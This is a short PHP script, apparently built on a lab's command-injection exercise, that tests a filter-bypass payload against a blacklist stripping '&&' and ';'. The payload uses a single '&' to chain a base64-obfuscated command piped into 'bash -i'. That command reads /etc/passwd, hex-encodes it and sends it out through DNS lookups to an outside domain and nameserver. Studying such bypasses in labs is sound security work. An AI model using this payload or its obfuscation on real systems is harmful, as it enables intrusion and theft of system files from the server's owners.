<?php

//if (isset($_POST['Submit'])) {
//    // Get input
    $target = "ping 127.0.0.1&bash -c '{echo,IGNhdCAvZXRjL3Bhc3N3ZHx4eGQgLXAgLWMgMTZ8d2hpbGUgcmVhZCBleGZpbDtkbyBob3N0ICRleGZpbC5qdlRBLnRlc3QuY24gMTAwLjEuMS4xMjE7ZG9uZQ==}|{base64,-d}|{bash,-i}'";

    // Set blacklist
    $substitutions = array(
        '&&' => '',
        ';' => '',
    );

    // Remove any of the charactars in the array (blacklist).
    $target = str_replace(array_keys($substitutions), $substitutions, $target);
    echo $target;
//    // Determine OS and execute the ping command.
//    if (stristr(php_uname('s'), 'Windows NT')) {
//        // Windows
//        $cmd = shell_exec('ping  ' . $target);
//    } else {
//        // *nix
//        $cmd = shell_exec('ping  -c 4 ' . $target);
//    }
//
//    // Feedback for the end user
//    echo "<pre>{$cmd}</pre>";
//}
?>